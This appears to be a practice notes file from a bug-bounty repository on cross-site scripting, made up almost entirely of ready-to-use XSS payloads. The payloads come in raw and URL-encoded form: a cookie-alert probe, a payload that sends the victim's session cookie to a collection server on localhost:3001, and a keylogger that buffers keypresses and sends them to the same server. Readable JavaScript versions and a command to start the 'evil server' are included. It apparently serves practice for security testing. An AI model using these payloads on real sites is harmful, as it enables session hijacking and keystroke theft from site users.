## Evil server 
``` node evil-server.js ```
[evil-server.js](https://github.com/fahimalshihab/Bug-Bounty/blob/main/XSS/Practice/evil-server.js)

## Document.cookie
  ``` js
  <img src="does-not-exist" onerror="alert(document.cookie)">
  ```
  ``` %3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(document.cookie)%22%3E```


## steal the session cookie
```js
    <img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">

```
``` %3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E```

* Here's the JavaScript code from the last example in a readable form:
```js
var img = document.createElement('img');
img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```


## key-logger:
```js
<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">
```

```
%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%3E
```

* Here's the JavaScript code from the last example in a readable form:
```js
var timeout;
var buffer = '';
document.querySelector('body').addEventListener('keypress', function(event) {
	if (event.which !== 0) {
		clearTimeout(timeout);
		buffer += String.fromCharCode(event.which);
		timeout = setTimeout(function() {
			var xhr = new XMLHttpRequest();
			var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
			xhr.open('GET', uri);
			xhr.send();
			buffer = '';
		}, 400);
	}
});
```

